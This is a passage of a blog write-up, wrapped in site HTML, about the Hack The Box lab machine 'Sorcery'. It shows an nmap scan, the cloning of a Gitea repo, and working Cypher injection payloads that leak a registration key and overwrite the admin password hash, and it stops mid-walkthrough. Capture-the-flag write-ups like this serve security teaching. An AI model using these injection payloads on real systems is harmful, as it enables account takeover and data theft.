@@ -1,0 +1,991 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/04/26/hackthebox-sorcery/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewSorcery is an insane-difficulty machine from Hack The Box that takes us through a long chain: Cypher injection on a Gitea-hosted Node.js storefront to leak a registration key and rewrite the a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Sorcery">
+<meta property="og:url" content="http://fouedsaidi.com/2026/04/26/Hackthebox-Sorcery/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewSorcery is an insane-difficulty machine from Hack The Box that takes us through a long chain: Cypher injection on a Gitea-hosted Node.js storefront to leak a registration key and rewrite the a">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/Sorcery.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/gitea-repo.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/gitea-repo2.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/web-store.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/web-product.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/regkey-leak.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/cypher-404.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/admin-login.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/admin-dash.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/passkey-block.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/webauthn.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/admin-loggedin.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/dns-panel.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/kafka-shell.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/mitmproxy-creds.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/ldap-ash.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/ldap-sudo.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/ldap-sudo2.png">
+<meta property="article:published_time" content="2026-04-26T16:07:03.000Z">
+<meta property="article:modified_time" content="2026-04-26T18:34:29.656Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Sorcery/Sorcery.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Sorcery -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Sorcery</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-04-26 19:07:03</span>
+        <span class="mobile">2026-04-26 19:07:03</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-04-26 21:34:29</span>
+            <span class="mobile">2026-04-26 21:34:29</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Sorcery is an insane-difficulty machine from Hack The Box that takes us through a long chain: Cypher injection on a Gitea-hosted Node.js storefront to leak a registration key and rewrite the admin password, a WebAuthn passkey bypass via Chrome DevTools virtual authenticator, custom Kafka protocol packet crafting against an internal <code>/debug</code> endpoint to land a foothold, abusing an internal CA to forge a TLS cert and pivot through chisel + mitmproxy to phish <code>tom_summers</code> credentials, OCR against an <code>Xvfb_screen0</code> dump to recover <code>tom_summers_admin</code>, leaking <code>ash_winter</code>‘s password from a <code>cleanup.sh</code> cron via <code>ps auxf</code>, and finally abusing FreeIPA <code>sudorule</code> and <code>sysadmins</code> group membership to land root.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/Sorcery.png"
+                      alt="Sorcery-info-card"
+                ><figcaption>Sorcery-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nmap -A -Pn 10.10.11.73 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-18 05:35 EDT</span><br><span class="line">Nmap scan report for 10.10.11.73</span><br><span class="line">Host is up (0.65s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 79:93:55:91:2d:1e:7d:ff:f5:da:d9:8e:68:cb:10:b9 (ECDSA)</span><br><span class="line">|_  256 97:b6:72:9c:39:a9:6c:dc:01:ab:3e:aa:ff:cc:13:4a (ED25519)</span><br><span class="line">443/tcp open  ssl/http nginx 1.27.1</span><br><span class="line">| tls-alpn: </span><br><span class="line">|   http/1.1</span><br><span class="line">|   http/1.0</span><br><span class="line">|_  http/0.9</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=sorcery.htb</span><br><span class="line">| Not valid before: 2024-10-31T02:09:11</span><br><span class="line">|_Not valid after:  2052-03-18T02:09:11</span><br><span class="line">|_http-title: Did not follow redirect to https://sorcery.htb/</span><br><span class="line">|_http-server-header: nginx/1.27.1</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=6/18%OT=22%CT=1%CU=43962%PV=Y%DS=2%DC=T%G=Y%TM=6852</span><br><span class="line">OS:88C4%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=9)</span><br><span class="line">OS:SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M542ST11NW7%O2=M542S</span><br><span class="line">OS:T11NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542ST11NW7%O6=M542ST11)WIN(W1=</span><br><span class="line">OS:FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=</span><br><span class="line">OS:M542NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)</span><br><span class="line">OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S</span><br><span class="line">OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(</span><br><span class="line">OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=</span><br><span class="line">OS:N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 110/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   642.29 ms 10.10.16.1</span><br><span class="line">2   317.66 ms 10.10.11.73</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 105.43 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Two ports: SSH on 22 and an nginx-fronted HTTPS site on 443. The TLS cert exposes the hostname <code>sorcery.htb</code>, so we throw that into <code>/etc/hosts</code> and start enumerating the web app.</p>
+<h2 id="Web-Application-https-sorcery-htb"><a href="#Web-Application-https-sorcery-htb" class="headerlink" title="Web Application - https://sorcery.htb/"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="https://sorcery.htb/" >https://sorcery.htb/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><p>Browsing to the site, we land on a login page at <code>https://sorcery.htb/auth/login</code>. Throwing common subdomains at the host, we discover a Gitea instance on <code>git.sorcery.htb</code>. Browsing it reveals a public repo <code>nicole_sullivan/infrastructure</code> we can clone:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Sorcery]</span><br><span class="line">└─$ GIT_SSL_NO_VERIFY=true git clone https://git.sorcery.htb/nicole_sullivan/infrastructure.git</span><br><span class="line">Cloning into &#x27;infrastructure&#x27;...</span><br><span class="line">remote: Enumerating objects: 169, done.</span><br><span class="line">remote: Counting objects: 100% (169/169), done.</span><br><span class="line">remote: Compressing objects: 100% (142/142), done.</span><br><span class="line">remote: Total 169 (delta 8), reused 169 (delta 8), pack-reused 0 (from 0)</span><br><span class="line">Receiving objects: 100% (169/169), 136.24 KiB | 148.00 KiB/s, done.</span><br><span class="line">Resolving deltas: 100% (8/8), done.</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>The repo has the full backend source for the storefront app, including a Cypher (Neo4j) datastore layer.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/gitea-repo.png"
+                      alt="Gitea infrastructure repo"
+                ><figcaption>Gitea infrastructure repo</figcaption></figure></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/gitea-repo2.png"
+                      alt="Gitea source files"
+                ><figcaption>Gitea source files</figcaption></figure></p>
+<p>Reading through <code>/backend/src/api</code>, we find that <code>/dashboard/store/&lt;uuid&gt;</code> builds a Cypher query by string-concatenating the route parameter into the query body. That’s a textbook Cypher injection sink, and crucially the response is reflected back in <code>description</code>.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/web-store.png"
+                      alt="Store page"
+                ><figcaption>Store page</figcaption></figure></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/web-product.png"
+                      alt="Product page"
+                ><figcaption>Product page</figcaption></figure></p>
+<h3 id="Cypher-Injection-Leaking-the-Registration-Key"><a href="#Cypher-Injection-Leaking-the-Registration-Key" class="headerlink" title="Cypher Injection - Leaking the Registration Key"></a>Cypher Injection - Leaking the Registration Key</h3><p>Registration on the public site requires a <code>registration_key</code> field that’s stored on a <code>Config</code> node. We can break out of the existing <code>MATCH</code> and pull <code>registration_key</code> into the response payload:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#125;) OPTIONAL MATCH (c:Config) RETURN result &#123; .*, description: coalesce(c.registration_key, result.description) &#125;//</span><br></pre></td></tr></table></figure></div>
+
+<p>URL encode it and append it to a valid product URL:</p>
+<p><code>https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f</code></p>
+<p>The <code>description</code> field of the response now reflects the leaked key:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/regkey-leak.png"
+                      alt="Leaked registration key"
+                ><figcaption>Leaked registration key</figcaption></figure></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd05d743-b560-45dc-9a09-43ab18c7a513</span><br></pre></td></tr></table></figure></div>
+
+<p>We use that value to register a new account.</p>
+<h3 id="Understanding-the-Submission-Flow"><a href="#Understanding-the-Submission-Flow" class="headerlink" title="Understanding the Submission Flow"></a>Understanding the Submission Flow</h3><p>After registering, we can submit a new product. Looking at <code>/backend/src/api/products</code>, the flow is:</p>
+<ol>
+<li><strong>Receives a product submission</strong> (name, description).</li>
+<li><strong>Creates and saves</strong> a new <code>Product</code> with <code>is_authorized = false</code> and current user as creator.</li>
+<li><strong>Gets the “admin” user</strong> from DB.</li>
+<li><strong>Generates a JWT</strong> token for the “admin”, with strict path restrictions and a short (60s) expiry.</li>
+<li><strong>Acquires a browser semaphore</strong> (to avoid running too many browsers at once).</li>
+<li><strong>Launches a headless Chrome browser</strong> (random port, no sandbox).</li>
+<li><strong>Sets a session cookie</strong> (<code>token</code>, value is the JWT, for the internal frontend).</li>
+<li><strong>Navigates the bot</strong> (headless browser) to the product’s dashboard page.</li>
+<li><strong>Waits 10 seconds, then closes browser</strong>.</li>
+<li><strong>Returns the product’s ID</strong> to the client.</li>
+</ol>
+<p>So the admin bot visits the URL of every submitted product. Combined with the Cypher injection, we can use the same primitive to <strong>rewrite the admin’s password</strong> directly in the Neo4j database.</p>
+<h3 id="Cypher-Injection-Rewriting-the-Admin-Password"><a href="#Cypher-Injection-Rewriting-the-Admin-Password" class="headerlink" title="Cypher Injection - Rewriting the Admin Password"></a>Cypher Injection - Rewriting the Admin Password</h3><p>First, generate an argon2 hash for a password we control:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Sorcery/infrastructure]</span><br><span class="line">└─$ python3                                                   </span><br><span class="line">Python 3.12.7 (main, Nov  8 2024, 17:55:36) [GCC 14.2.0] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; from argon2 import PasswordHasher</span><br><span class="line">&gt;&gt;&gt; ph = PasswordHasher()</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; ph = PasswordHasher()</span><br><span class="line">&gt;&gt;&gt; print(ph.hash(&quot;kujen&quot;))</span><br><span class="line">$argon2id$v=19$m=65536,t=3,p=4$/5KLjIeMhLopjr156Sldcw$mfGhv1Reg2Cm33L/Gl657JEnKdIrisJsxuFUKjZ1tXk</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>The password update payload:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#125;) MATCH (u:User &#123;username: &quot;admin&quot;&#125;) SET u.password= &quot;&lt;argon_hash&gt;&quot; RETURN result &#123; .*, description: &quot;Password updated&quot; &#125; AS result //</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#125;) MATCH (u:User &#123;username: &quot;admin&quot;&#125;) SET u.password= &quot;$argon2id$v=19$m=65536,t=3,p=4$/5KLjIeMhLopjr156Sldcw$mfGhv1Reg2Cm33L/Gl657JEnKdIrisJsxuFUKjZ1tXk&quot; RETURN result &#123; .*, description: &quot;Password updated&quot; &#125; AS result //</span><br></pre></td></tr></table></figure></div>
+
+<p>Sending this with single quotes around the username&#x2F;hash returns a 404:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/cypher-404.png"
+                      alt="404 from injection attempt"
+                ><figcaption>404 from injection attempt</figcaption></figure></p>
+<p>The route parser appears to choke on the unescaped single quotes. Switching to double quotes for the inner Cypher literals fixes the parse, and using a known argon2 hash for <code>admin123</code> keeps things deterministic:</p>
